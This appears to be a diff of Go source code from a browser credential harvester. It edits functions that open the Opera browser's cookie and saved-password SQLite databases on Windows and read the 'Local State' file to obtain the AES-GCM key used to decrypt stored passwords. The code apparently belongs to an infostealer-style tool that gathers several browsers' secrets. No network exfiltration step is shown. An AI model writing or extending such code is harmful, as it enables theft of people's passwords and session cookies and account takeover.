@@ -12,12 +12,13 @@ import (
 	"path/filepath"
 )
 
-func ReadOperaCookies() ([]Cookie, error) {
-	osUser, err := utils.GetCurrentUsername()
+/*
+func ReadOperaCookies(path, query string) ([]Cookie, error) {
+	osUser, err := os.UserHomeDir()
 	if err != nil {
 		return nil, err
 	}
-	cookiesPath := filepath.Join("C:\\Users", osUser, "AppData\\Roaming\\Opera Software\\Opera Stable\\Network\\Cookies")
+	cookiesPath := filepath.Join(osUser, path)
 
 	dbConn, err := sql.Open("sqlite3", fmt.Sprintf("file:%s?cache=shared&mode=ro", cookiesPath))
 	if err != nil {
@@ -29,10 +30,7 @@ func ReadOperaCookies() ([]Cookie, error) {
 	if err != nil {
 		return nil, err
 	}
-	rows, err := dbConn.Query(`SELECT host_key as Domain, expires_utc as Expires, 
-		is_httponly as HttpOnly, name as Name, path as Path, 
-		is_secure as Secure, value as Value, encrypted_value as EncryptedValue 
-		FROM cookies;`)
+	rows, err := dbConn.Query(query)
 	if err != nil {
 		return nil, err
 	}
@@ -64,7 +62,7 @@ func ReadOperaCookies() ([]Cookie, error) {
 		cookies = append(cookies, cookie)
 	}
 	return cookies, nil
-}
+}*/
 
 func ReadOperaPasswords() ([]Password, error) {
 	osUser, err := utils.GetCurrentUsername()
@@ -79,7 +77,7 @@ func ReadOperaPasswords() ([]Password, error) {
 	}
 	defer dbConn.Close()
 
-	err = getAesGCMKeyEdge()
+	err = getAesGCMKeyOpera()
 	if err != nil {
 		return nil, err
 	}
@@ -115,7 +113,7 @@ func getAesGCMKeyOpera() error {
 		return err
 	}
 
-	localStatePath := filepath.Join("C:\\Users", osUser, "AppData\\Roaming\\Opera Software\\Opera Stable\\Local State")
+	localStatePath := filepath.Join("C:\\Users", osUser, "\\AppData\\Roaming\\Opera Software\\Opera Stable\\Local State")
 	data, err := os.ReadFile(localStatePath)
 	if err != nil {
 		return err
